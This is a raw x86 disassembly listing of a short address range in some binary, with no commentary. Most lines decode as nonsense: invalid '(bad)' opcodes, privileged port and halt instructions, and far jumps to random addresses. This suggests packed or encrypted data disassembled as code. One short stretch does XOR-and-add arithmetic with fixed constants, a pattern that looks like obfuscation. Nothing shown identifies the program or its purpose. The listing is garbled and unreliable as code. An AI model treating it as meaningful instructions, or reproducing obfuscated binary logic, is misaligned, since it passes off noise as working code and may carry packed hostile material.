  41b1c8:	mov    al,ds:0xdcad715e
  41b1cd:	cmp    DWORD PTR [edi+0x2d],0xffffffdc
  41b1d1:	fwait
  41b1d2:	loop   0x41b177
  41b1d4:	fcomp  QWORD PTR [esp+eax*1-0x133efc42]
  41b1db:	(bad)  
  41b1dc:	push   0xffffffe8
  41b1de:	xor    al,0xa7
  41b1e0:	repnz mov al,0x51
  41b1e3:	dec    ecx
  41b1e4:	mov    eax,DWORD PTR [ebp-0x1c]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	rcr    BYTE PTR ss:[di-0x2d],0x65
  41b1fb:	mov    edi,0x787fdc28
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b246
  41b205:	xor    edx,DWORD PTR [edi+0x4adf08e4]
  41b20b:	push   ecx
  41b20c:	dec    edi
  41b20d:	pop    es
  41b20e:	daa    
  41b20f:	jecxz  0x41b19d
  41b211:	cmp    DWORD PTR [edi-0xed58a9f],edi
  41b217:	fcmovu st,st(1)
  41b219:	push   0xc9138093
  41b21e:	loope  0x41b1e5
  41b220:	mov    al,ds:0xafa28e9b
  41b225:	ins    BYTE PTR es:[edi],dx
  41b226:	inc    DWORD PTR [ecx]
  41b228:	js     0x41b1eb
  41b22a:	sbb    DWORD PTR [esi-0x3a45b7b4],esp
  41b230:	pusha  
  41b231:	mov    eax,0x3d198057
  41b236:	mov    eax,0x4a881a91
  41b23b:	xchg   ebp,eax
  41b23c:	push   eax
  41b23d:	retf   
  41b23e:	sub    eax,0xd93a9c5c
  41b243:	in     al,0xdc
  41b245:	sub    DWORD PTR [esi],eax
  41b247:	aad    0xa9
  41b249:	pop    edx
  41b24a:	push   ebx
  41b24b:	js     0x41b2aa
  41b24d:	outs   dx,BYTE PTR ds:[esi]
  41b24e:	je     0x41b220
  41b250:	(bad)  
  41b251:	jne    0x41b233
  41b253:	icebp  
  41b254:	scas   al,BYTE PTR es:[edi]
  41b255:	push   cs
  41b256:	call   0x9f4eae12
  41b25b:	lods   al,BYTE PTR ds:[esi]
  41b25c:	lods   eax,DWORD PTR ds:[esi]
  41b25d:	out    0xe5,al
  41b25f:	mov    ecx,0xebc9d818
  41b264:	mov    eax,ds:0xf2ca370b
  41b269:	shr    BYTE PTR [esi+0x20],cl
  41b26c:	cmc    
  41b26d:	mov    ds:0x55ff46ff,eax
  41b272:	mov    esi,0x94f502fc
  41b277:	idiv   edi
  41b279:	sbb    al,0xcf
  41b27b:	imul   ebp,DWORD PTR [ebx+0x45],0x1b2302ba
  41b282:	inc    edi
  41b283:	aaa    
  41b284:	bound  esi,QWORD PTR [ecx]
  41b286:	and    DWORD PTR [ebx+ebp*4-0x37],ecx
  41b28a:	inc    esp
  41b28b:	push   ds
  41b28c:	adc    al,0x55
  41b28e:	and    BYTE PTR [edx-0x1fc86f2b],al
  41b294:	imul   esi,DWORD PTR [ebx],0xffffffa9
  41b297:	push   esi
  41b298:	sub    BYTE PTR gs:[ecx-0x68],al
  41b29c:	sub    DWORD PTR [edx-0x4520a31c],edx
  41b2a2:	scas   eax,DWORD PTR es:[edi]
  41b2a3:	inc    edx
  41b2a4:	or     esp,DWORD PTR [eax]
  41b2a6:	mov    cl,BYTE PTR [edx+0x41bbd56c]
  41b2ac:	je     0x41b27d
  41b2ae:	push   ds
  41b2af:	adc    esi,DWORD PTR [esi-0x7ff1904e]
  41b2b5:	adc    BYTE PTR [edi-0x61],bh
  41b2b8:	daa    
  41b2b9:	jno    0x41b263
  41b2bb:	mov    bh,0x80
  41b2bd:	or     DWORD PTR [esi-0xb],edx
  41b2c0:	fdiv   st,st(4)
  41b2c2:	mov    dl,0x42
  41b2c4:	cmp    DWORD PTR [ebx+esi*1],esi
  41b2c7:	sti    
  41b2c8:	pop    edi
  41b2c9:	les    edx,FWORD PTR [esi-0x1d]
  41b2cc:	xchg   DWORD PTR [edx],ebp
  41b2ce:	or     bl,dh
  41b2d0:	fldcw  WORD PTR [ecx-0x68]
  41b2d3:	sub    BYTE PTR [ecx+0x11],0x17
  41b2d7:	js     0x41b2d2
  41b2d9:	or     ebp,DWORD PTR [ebp+0x52024d42]
  41b2df:	mov    cl,ah
  41b2e1:	mov    edx,0x6de23563
  41b2e6:	imul   DWORD PTR [ebp+0x5fb4f18]
  41b2ec:	cmp    al,0x58
  41b2ee:	je     0x41b2b3
  41b2f0:	out    dx,al
  41b2f1:	nop
  41b2f2:	mov    eax,0x8c80c079
  41b2f7:	dec    ebp
  41b2f8:	in     eax,0x39
  41b2fa:	inc    eax
  41b2fb:	pop    esi
  41b2fc:	mov    eax,DWORD PTR [edx-0x4b]
  41b2ff:	ja     0x41b320
  41b301:	aad    0x70
  41b303:	push   es
  41b304:	pop    esi
  41b305:	mov    cl,0xa9
  41b307:	add    al,0xad
  41b309:	dec    ebp
  41b30a:	popf   
  41b30b:	mov    ebx,0x580ef35a
  41b310:	cmp    BYTE PTR [ebp-0x16],bh
  41b313:	cli    
  41b314:	xchg   esi,eax
  41b315:	or     al,0x68
  41b317:	jp     0x41b2e0
  41b319:	mov    ds:0x5b8cd21d,al
  41b31e:	and    DWORD PTR [edi],eax
  41b320:	les    eax,FWORD PTR [edi-0x7a814e30]
  41b326:	and    DWORD PTR [esi+0x796844f2],esi
  41b32c:	dec    ecx
  41b32d:	sbb    cl,dh
  41b32f:	xor    al,0xcc
  41b331:	aaa    
  41b332:	jbe    0x41b2e7
  41b334:	iret   
  41b335:	addr16 inc ebp
  41b337:	sahf   
  41b338:	int    0x86
  41b33a:	xor    ebp,DWORD PTR [edi+0xb]
  41b33d:	mov    BYTE PTR [ebx-0x23],dh
  41b340:	and    ecx,edx
  41b342:	cmp    BYTE PTR [edi],dl
  41b344:	jne    0x41b3b3
  41b346:	mov    bh,bh
  41b348:	loopne 0x41b382
  41b34a:	test   BYTE PTR [eax],bh
  41b34c:	dec    edx
  41b34d:	fcom   QWORD PTR [ebp-0x4a92d9a7]
  41b353:	sub    al,0xc4
  41b355:	xor    eax,DWORD PTR [ebp-0x652b8f8c]
  41b35b:	stc    
  41b35c:	pop    es
  41b35d:	inc    ecx
  41b35e:	and    BYTE PTR [esi-0x3f],al
  41b361:	push   ds
  41b362:	push   edx
  41b363:	bound  ebp,QWORD PTR [ebp-0x6b]
  41b366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b367:	cdq    
  41b368:	push   esi
  41b369:	stos   BYTE PTR es:[edi],al
  41b36a:	push   es
  41b36b:	cmp    DWORD PTR [esi],ebx
  41b36d:	or     DWORD PTR ss:[ebp-0x39],0xa52d2b1c
  41b375:	retf   0x79da
  41b378:	outs   dx,DWORD PTR ds:[esi]
  41b379:	repnz cmp BYTE PTR [ecx-0x6d],ch
  41b37d:	mov    edx,0x8ed39629
  41b382:	mov    esi,0x952a9995
  41b387:	and    eax,0x85b9457
  41b38c:	jg     0x41b364
  41b38e:	data16 lods al,BYTE PTR ds:[esi]
  41b390:	mov    esi,0xa13df5a2
  41b395:	test   BYTE PTR [ecx+0x44],dh
  41b398:	pop    ebx
  41b399:	scas   al,BYTE PTR es:[edi]
  41b39a:	xchg   esi,eax
  41b39b:	int    0x1d
  41b39d:	fdiv   DWORD PTR [edi+0x5e9b011c]
  41b3a3:	xor    ah,al
  41b3a5:	dec    esi
  41b3a6:	outs   dx,DWORD PTR ds:[esi]
  41b3a7:	scas   al,BYTE PTR es:[edi]
  41b3a8:	mov    al,ds:0xace490cb
  41b3ad:	mov    WORD PTR fs:[edi-0x5d],gs
  41b3b1:	stc    
  41b3b2:	sub    BYTE PTR [eax+0x52],dh
  41b3b5:	mov    cs,WORD PTR [edi+0x4e]
  41b3b8:	mov    dl,0x8d
  41b3ba:	(bad)  
  41b3bb:	arpl   WORD PTR [ebx+0x9],bp
  41b3be:	cli    
  41b3bf:	xchg   esi,eax
  41b3c0:	add    al,0x5b
  41b3c2:	out    dx,eax
  41b3c3:	in     eax,0x2e
  41b3c5:	fadd   st,st(1)
  41b3c7:	fwait
  41b3c8:	mov    esp,esi
  41b3ca:	sbb    ebp,0x6e
  41b3cd:	xor    eax,0x8d8b2357
  41b3d2:	fiadd  DWORD PTR [ebx+0x4f]
  41b3d5:	inc    ebx
  41b3d6:	aaa    
  41b3d7:	shl    esi,cl
  41b3d9:	xchg   ebp,eax
  41b3da:	dec    ecx
  41b3db:	test   DWORD PTR [edx],eax
  41b3dd:	add    DWORD PTR [edx],esi
  41b3df:	and    eax,0x3d769e87
  41b3e4:	push   0x6b0ab758
  41b3e9:	inc    eax
  41b3ea:	fwait
  41b3eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3ec:	cdq    
  41b3ed:	jnp    0x41b3fb
  41b3ef:	dec    ebp
  41b3f0:	xchg   ecx,eax
  41b3f1:	mov    edx,edx
  41b3f3:	shl    dh,cl
  41b3f5:	out    dx,al
  41b3f6:	loope  0x41b421
  41b3f8:	lock xchg al,bh
  41b3fb:	test   DWORD PTR [ecx-0x41],0x37032435
  41b402:	test   al,0x45
  41b404:	sub    BYTE PTR ds:0x35d6e831,0x6e
  41b40b:	fbstp  TBYTE PTR [eax+0x59c948a7]
  41b411:	out    dx,eax
  41b412:	hlt    
  41b413:	mov    edi,0x4250d92b
  41b418:	pop    es
  41b419:	pop    eax
  41b41a:	out    dx,al
  41b41b:	pop    eax
  41b41c:	imul   eax,ecx
  41b41f:	sub    esp,eax
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	leave  
  41b4ba:	outs   dx,DWORD PTR ds:[esi]
  41b4bb:	bound  ecx,QWORD PTR [eax-0x40]
  41b4be:	loop   0x41b53f
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b45f
  41b4c6:	cwde   
  41b4c7:	ss dec ebp
  41b4c9:	add    BYTE PTR [ebp-0x65],dl
  41b4cc:	mov    edi,0xad0daeff
  41b4d1:	xor    DWORD PTR [ecx],0xb8bbc57b
  41b4d7:	(bad)  
  41b4d8:	aad    0xfe
  41b4da:	jmp    0x41b45d
  41b4dc:	mov    edx,0x9a3da676
  41b4e1:	lods   eax,DWORD PTR ds:[esi]
  41b4e2:	lahf   
  41b4e3:	and    eax,0x346b59bb
  41b4e8:	jmp    0x41b471
  41b4ea:	cmp    DWORD PTR [ecx-0x13e4e409],ebx
  41b4f0:	push   0xca13bade
  41b4f5:	stos   DWORD PTR es:[edi],eax
  41b4f6:	push   ecx
  41b4f7:	imul   ebx,DWORD PTR ds:0x7d2c4f3b,0x52dd693d
  41b501:	push   eax
  41b502:	inc    eax
  41b503:	inc    edi
  41b504:	dec    ebp
  41b505:	ficom  DWORD PTR [ecx-0x7c4edaec]
  41b50b:	lahf   
  41b50c:	cli    
  41b50d:	jl     0x41b4c7
  41b50f:	jo     0x41b50a
  41b511:	adc    esp,DWORD PTR [edi]
  41b513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b514:	or     ebp,ebp
  41b516:	mov    edx,0xf43854c2
  41b51b:	je     0x41b556
  41b51d:	lods   al,BYTE PTR ds:[esi]
  41b51e:	xchg   ebp,eax
  41b51f:	lods   eax,DWORD PTR ds:[esi]
  41b520:	sar    DWORD PTR [edi-0x4a9290b4],0x75
  41b527:	push   ss
  41b528:	and    eax,0x6091e4f9
  41b52d:	mov    DWORD PTR [edi+0x56],ecx
  41b530:	sti    
  41b531:	rcl    DWORD PTR [ecx+0x48],cl
  41b534:	or     dh,BYTE PTR ds:0xad07a756
  41b53a:	fxch   st(0)
  41b53c:	cmp    BYTE PTR [edx-0x46],ch
  41b53f:	into   
  41b540:	mov    ds:0xf23f24ae,al
  41b545:	dec    esp
  41b546:	popf   
  41b547:	(bad)  
  41b548:	retf   
  41b549:	sub    bl,BYTE PTR [ebx-0x7938b91d]
  41b54f:	jne    0x41b5a5
  41b551:	or     eax,DWORD PTR [edx-0x4c60e8ba]
  41b557:	enter  0x700f,0x38
  41b55b:	cmp    al,0x59
  41b55d:	xchg   ebp,eax
  41b55e:	mov    ebx,edx
  41b560:	push   edx
  41b561:	sub    al,0xf
  41b563:	aaa    
  41b564:	pop    ss
  41b565:	or     BYTE PTR [ebx-0x6c8c968b],0xac
  41b56c:	loope  0x41b5cd
  41b56e:	xchg   esi,eax
  41b56f:	lods   eax,DWORD PTR ds:[esi]
  41b570:	mov    edx,0x3cd29a3d
  41b575:	(bad)  
  41b576:	jmp    0xcf1ca704
  41b57b:	mov    WORD PTR [ebp-0x2b],es
  41b57e:	test   eax,0xdc490548
  41b583:	push   ecx
  41b584:	jbe    0x41b5c3
  41b586:	xchg   DWORD PTR [ebp-0x68],eax
  41b589:	rcr    bl,0x13
  41b58c:	(bad)  [ecx+0x6f]
  41b58f:	lock mov bh,0xf6
  41b592:	popf   
  41b593:	sbb    al,0x57
  41b595:	dec    eax
  41b596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b597:	sub    DWORD PTR [edx+0x195b0693],eax
  41b59d:	outs   dx,DWORD PTR ds:[esi]
  41b59e:	sbb    ebp,ecx
  41b5a0:	ins    DWORD PTR es:[edi],dx
  41b5a1:	inc    eax
  41b5a2:	rcr    BYTE PTR [ecx+0x73],0xcd
  41b5a6:	rcl    DWORD PTR [ecx-0x3cc4ee1b],1
  41b5ac:	clc    
  41b5ad:	cmp    al,0x5f
  41b5af:	sar    DWORD PTR [ebp+0x76],1
  41b5b2:	pop    edi
  41b5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5b4:	push   ds
  41b5b5:	stc    
  41b5b6:	mov    DWORD PTR [ecx],ecx
  41b5b8:	maskmovq mm2,(bad)
  41b5b9:	not    DWORD PTR [esi]
  41b5bb:	nop
  41b5bc:	xor    ebx,DWORD PTR [eax]
  41b5be:	lea    ebp,[eax]
  41b5c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5c1:	lahf   
  41b5c2:	cmp    dh,BYTE PTR [ecx+eiz*8+0xf]
  41b5c6:	mov    bh,0x0
  41b5c8:	jnp    0x41b5f9
  41b5ca:	jmp    0xe9a5fb46
  41b5cf:	(bad)  
  41b5d0:	adc    BYTE PTR [edi-0x1a],dh
  41b5d3:	mov    edx,DWORD PTR [ecx]
  41b5d5:	jp     0x41b5ac
  41b5d7:	mov    ch,ah
  41b5d9:	ret    
  41b5da:	outs   dx,DWORD PTR ds:[esi]
  41b5db:	stos   DWORD PTR es:[edi],eax
  41b5dc:	mov    DWORD PTR [ebp+0x39],edx
  41b5df:	mov    dl,0xd4
  41b5e1:	dec    BYTE PTR [ecx]
  41b5e3:	(bad)  
  41b5e4:	in     al,dx
  41b5e5:	sub    DWORD PTR ds:0xdd22219a,edx
  41b5eb:	(bad)  
  41b5ec:	adc    al,0xf2
  41b5ee:	arpl   WORD PTR [ebx+0x433c2d47],bx
  41b5f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f5:	sub    BYTE PTR [esp+edx*4],dl
  41b5f8:	shr    BYTE PTR [edi-0x2aecb038],cl
  41b5fe:	xchg   al,dh
  41b600:	outs   dx,BYTE PTR ds:[esi]
  41b601:	sub    edx,DWORD PTR [edi]
  41b603:	or     DWORD PTR [ecx],edx
  41b605:	arpl   WORD PTR [edi],sp
  41b607:	outs   dx,BYTE PTR ds:[esi]
  41b608:	sub    ah,bh
  41b60a:	retf   0x5c90
  41b60d:	les    edx,FWORD PTR [ebx+eax*1-0x4926d894]
  41b614:	push   edx
  41b615:	inc    esi
  41b616:	adc    BYTE PTR [esi],cl
  41b618:	mov    dl,0xd2
  41b61a:	or     bh,dl
  41b61c:	retf   0xe9be
  41b61f:	xchg   esi,eax
  41b620:	ins    DWORD PTR es:[edi],dx
  41b621:	and    al,0xac
  41b623:	loop   0x41b62a
  41b625:	out    0x57,al
  41b627:	jl     0x41b624
  41b629:	jo     0x41b60f
  41b62b:	call   0xa4f62eb9
  41b630:	out    0x9c,al
  41b632:	ss jmp 0xb5c6:0x6458b648
  41b63a:	cmp    edi,DWORD PTR [edi-0x423f2a5b]
  41b640:	arpl   WORD PTR [edx+ecx*1+0x644b7aae],cx
  41b647:	loopne 0x41b6b4
  41b649:	je     0x41b633
  41b64b:	(bad)  
  41b64c:	cwde   
  41b64d:	rcl    ah,1
  41b64f:	inc    ebx
  41b650:	clc    
  41b651:	stos   BYTE PTR es:[edi],al
  41b652:	pusha  
  41b653:	cmp    BYTE PTR [esi],ch
  41b655:	pop    edx
  41b656:	(bad)  
  41b658:	(bad)  
  41b659:	jl     0x41b5f1
  41b65b:	xchg   edi,eax
  41b65c:	pop    ss
  41b65d:	(bad)  
  41b65e:	call   0x9c10:0xfb525ffd
  41b665:	mov    dh,0x16
  41b667:	xchg   ebx,eax
  41b668:	cdq    
  41b669:	pop    edi
  41b66a:	cmp    BYTE PTR [ecx],0x4a
  41b66d:	push   ds
  41b66e:	fidivr WORD PTR [ecx]
  41b670:	ror    BYTE PTR [ebx],1
  41b672:	xchg   ecx,eax
  41b673:	(bad)  
  41b674:	jmp    0x87078ef4
  41b679:	mov    esi,0x4cdd6e9d
  41b67e:	xchg   BYTE PTR [ecx-0x711f575],bh
  41b684:	loopne 0x41b634
  41b686:	fild   DWORD PTR [ebx]
  41b688:	push   ebp
  41b689:	std    
  41b68a:	imul   esp,DWORD PTR [ebx],0x99af8cc6
  41b690:	add    DWORD PTR [edi-0x49018bd7],esi
  41b696:	ret    
  41b697:	add    eax,0x731004fa
  41b69c:	scas   al,BYTE PTR es:[edi]
  41b69d:	cmc    
  41b69e:	nop
  41b69f:	call   0xe424:0x68e9d261
  41b6a6:	jecxz  0x41b628
  41b6a8:	push   edx
  41b6a9:	punpckhdq mm7,mm2
  41b6ac:	int    0xb9
  41b6ae:	int    0x9b
  41b6b0:	jg     0x41b692
  41b6b2:	inc    cl
  41b6b4:	and    ebx,DWORD PTR [edi+0xdbc1007]
  41b6ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6bb:	or     al,0xeb
  41b6bd:	add    al,0x32
  41b6bf:	lods   eax,DWORD PTR ds:[esi]
  41b6c0:	jbe    0x41b730
  41b6c2:	outs   dx,DWORD PTR ds:[esi]
  41b6c3:	out    0x37,eax
  41b6c5:	out    0xff,eax
  41b6c7:	scas   eax,DWORD PTR es:[edi]
  41b6c8:	mov    cs,WORD PTR ds:0x5bd39e96
  41b6ce:	inc    esi
  41b6cf:	gs call 0xb9c9:0xe301669f
  41b6d7:	pop    esp
  41b6d8:	dec    esp
  41b6d9:	fld    TBYTE PTR [eax-0x7e]
  41b6dc:	jmp    0x41b711
  41b6de:	rol    DWORD PTR [ebx],0xc6
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx+0x697b68f6]
  41b6f4:	dec    DWORD PTR [ecx+0x787fe0d8]
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b6eb
  41b6ff:	test   ch,0xdc
  41b702:	ds sub ebp,esp
  41b705:	sbb    bh,ch
  41b707:	lock outs dx,BYTE PTR ds:[esi]
  41b709:	adc    eax,0xa5ec971a
  41b70e:	and    ch,BYTE PTR [ecx+eiz*8-0x270f5cd4]
  41b715:	inc    edi
  41b716:	loop   0x41b734
  41b718:	add    al,0x98
  41b71a:	fst    DWORD PTR cs:[ecx+0x66]
  41b71e:	adc    edx,eax
  41b720:	and    al,0x93
  41b722:	mov    eax,0x47fd360a
  41b727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b728:	icebp  
  41b729:	jns    0x41b6ee
  41b72b:	(bad)  
  41b72c:	repz mov al,ds:0xd3d6d64b
  41b732:	test   BYTE PTR [eax-0x2b8c2ffe],dh
  41b738:	scas   eax,DWORD PTR es:[edi]
  41b739:	adc    eax,0x28dbbea9
  41b73e:	pushf  
  41b73f:	and    al,0x71
  41b741:	sub    DWORD PTR [ebx+ebp*1-0x52311e75],edx
  41b748:	pushf  
  41b749:	push   esp
  41b74a:	sub    al,0xca
  41b74c:	outs   dx,DWORD PTR ds:[esi]
  41b74d:	out    0x6a,al
  41b74f:	es in  al,dx
  41b751:	pop    ss
  41b752:	and    eax,0x5be1296d
  41b757:	inc    ebx
  41b758:	jmp    0xf0a29cc
  41b75d:	and    BYTE PTR [edi],bh
  41b75f:	sub    al,0x12
  41b761:	in     al,0x9e
  41b763:	repz xchg esp,eax
  41b765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b766:	inc    edx
  41b767:	popf   
  41b768:	clc    
  41b769:	add    eax,0x26a0243d
  41b76e:	add    cl,0xea
  41b771:	mov    edi,0xe3add1a1
  41b776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b777:	shr    BYTE PTR [eax-0xc188437],1
  41b77d:	and    al,0x19
  41b77f:	pop    ebp
  41b780:	scas   al,BYTE PTR es:[edi]
  41b781:	sbb    bh,dh
  41b783:	mov    ds:0xb5e56c53,al
  41b788:	xor    eax,0x37fe4197
  41b78d:	push   cs
  41b78e:	pop    ebx
  41b78f:	imul   edi,esi,0x6b
  41b792:	dec    edx
  41b793:	in     eax,dx
  41b794:	ja     0x41b79f
  41b796:	pop    ds
  41b797:	ins    DWORD PTR es:[edi],dx
  41b798:	inc    ecx
  41b799:	pop    esi
  41b79a:	push   ecx
  41b79b:	cld    
  41b79c:	push   ss
  41b79d:	jmp    0x41b759
  41b79f:	mov    ch,0x5c
  41b7a1:	scas   al,BYTE PTR es:[edi]
  41b7a2:	scas   al,BYTE PTR es:[edi]
  41b7a3:	mov    ds:0xf9b21e6a,al
  41b7a8:	pop    ebp
  41b7a9:	cmp    BYTE PTR [edi-0x78074656],dh
  41b7af:	shr    BYTE PTR [ecx+0x38],0x26
  41b7b3:	ss push esi
  41b7b5:	jge    0x41b799
  41b7b7:	xchg   edi,eax
  41b7b8:	jo     0x41b785
  41b7ba:	and    eax,0x7ec113df
  41b7bf:	test   BYTE PTR [esi+edx*1-0x65],0x87
  41b7c4:	clc    
  41b7c5:	icebp  
  41b7c6:	cld    
  41b7c7:	mov    ebx,0xfa8c7f04
  41b7cc:	lods   al,BYTE PTR ds:[esi]
  41b7cd:	mov    eax,0x9188ddb3
  41b7d2:	or     al,0x3e
  41b7d4:	xchg   edx,eax
  41b7d5:	add    al,0x2d
  41b7d7:	xor    DWORD PTR [ebx+0x70],ecx
  41b7da:	push   es
  41b7db:	xchg   ebx,eax
  41b7dc:	jle    0x41b765
  41b7de:	cs retf 0xc92b
  41b7e2:	cmp    eax,0xea0a7f2f
  41b7e7:	jne    0x41b7ae
  41b7e9:	scas   al,BYTE PTR es:[edi]
  41b7ea:	inc    esp
  41b7eb:	pop    eax
  41b7ec:	test   DWORD PTR [edi-0x510016f7],ecx
  41b7f2:	test   eax,0x323c8c7d
  41b7f7:	fidivr WORD PTR [ecx+0x4f]
  41b7fa:	fisttp QWORD PTR [edx+ecx*1+0x1c418340]
  41b801:	xor    al,BYTE PTR [ebx+eiz*4]
  41b804:	retf   
  41b805:	xor    BYTE PTR [ebx-0x537ce159],ah
  41b80b:	jno    0x41b7dd
  41b80d:	push   ebx
  41b80e:	pop    ds
  41b80f:	add    ecx,DWORD PTR [eiz*2+0x25e870bd]
  41b816:	mov    bl,0x7d
  41b818:	dec    esp
  41b819:	cli    
  41b81a:	mov    dh,0x89
  41b81c:	popf   
  41b81d:	cmc    
  41b81e:	call   DWORD PTR [edx+0x76]
  41b821:	push   esp
  41b822:	push   edx
  41b823:	ins    DWORD PTR es:[edi],dx
  41b824:	xchg   ecx,eax
  41b825:	bound  edx,QWORD PTR [edi-0x18]
  41b828:	(bad)  
  41b829:	test   eax,0xa92225d2
  41b82e:	(bad)  
  41b830:	xchg   ebp,eax
  41b831:	sub    eax,0xea7b822c
  41b836:	dec    edi
  41b837:	xor    BYTE PTR [edi-0x7db76787],bh
  41b83d:	add    ah,BYTE PTR [ecx]
  41b83f:	cmp    cl,bh
  41b841:	xor    DWORD PTR [ecx-0x5edd1993],ebx
  41b847:	sahf   
  41b848:	inc    esi
  41b849:	or     al,0x1d
  41b84b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41b84d:	lahf   
  41b84e:	(bad)  [ebx-0xa]
  41b851:	sbb    bh,0x3c
  41b854:	daa    
  41b855:	mov    cl,0x60
  41b857:	gs add al,0x27
  41b85a:	mov    eax,ds:0x5302a857
  41b85f:	mov    ds:0x55c15039,al
  41b864:	scas   eax,DWORD PTR es:[edi]
  41b865:	mov    ah,BYTE PTR [edi-0x4e3002a3]
  41b86b:	out    0x7c,eax
  41b86d:	fiadd  WORD PTR [ebp-0x66]
  41b870:	in     al,0x35
  41b872:	fwait
  41b873:	or     BYTE PTR [edx-0x3b17e99d],al
  41b879:	lds    ebx,FWORD PTR [edx+0x74]
  41b87c:	(bad)  
  41b87d:	(bad)  
  41b87e:	sbb    BYTE PTR [eax],cl
  41b880:	(bad)  
  41b881:	or     al,0x42
  41b883:	push   0x2539dc9c
  41b888:	sbb    esi,ecx
  41b88a:	push   edx
  41b88b:	fnstsw WORD PTR [edx]
  41b88d:	inc    edi
  41b88e:	cmp    al,0x5f
  41b890:	mov    cl,0x3f
  41b892:	sub    eax,0x7f94fdca
  41b897:	icebp  
  41b898:	div    DWORD PTR [ecx+0x19962189]
  41b89e:	or     BYTE PTR [ebx+0x35564606],cl
  41b8a4:	add    bl,ah
  41b8a6:	mov    bh,BYTE PTR [edx+0x42d75b98]
  41b8ac:	push   ss
  41b8ad:	fwait
  41b8ae:	rcl    DWORD PTR [eax-0x344bfb03],1
  41b8b4:	xlat   BYTE PTR ds:[ebx]
  41b8b5:	sub    eax,0x8b5e2fce
  41b8ba:	sti    
  41b8bb:	and    bh,BYTE PTR [esi+0xf920a35]
  41b8c1:	inc    esi
  41b8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8c3:	dec    edi
  41b8c4:	enter  0x3cd1,0x8
  41b8c8:	mov    ebx,0xfedc3847
  41b8cd:	stos   DWORD PTR es:[edi],eax
  41b8ce:	mov    edx,0x774f48cc
  41b8d3:	jge    0x41b8c0
  41b8d5:	add    al,0xd6
  41b8d7:	xor    edi,DWORD PTR [esi+ecx*2-0x37]
  41b8db:	xor    ebp,DWORD PTR [edi]
  41b8dd:	mov    eax,DWORD PTR [edx]
  41b8df:	in     al,0x6d
  41b8e1:	mov    DWORD PTR [eax],eax
  41b8e3:	jnp    0x41b8da
  41b8e5:	retf   0x9446
  41b8e8:	mov    al,ds:0x48b6ec13
  41b8ed:	(bad)  [esi+eiz*4-0x7c2e9fd8]
  41b8f4:	jno    0x41b8ef
  41b8f6:	push   cs
  41b8f7:	(bad)  
  41b8f8:	lock repz cmp dl,BYTE PTR [ebx]
  41b8fc:	ja     0x41b8e1
  41b8fe:	(bad)  
  41b8ff:	in     al,0x36
  41b901:	sub    BYTE PTR ds:0x9fdddbce,dh
  41b907:	mov    edi,0xf43f054a
  41b90c:	mov    fs,WORD PTR [edi+0x7e3075c7]
  41b912:	push   esi
  41b913:	xor    BYTE PTR [eiz*8-0x74fd50f1],ah
  41b91a:	push   ebp
  41b91b:	cld    
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
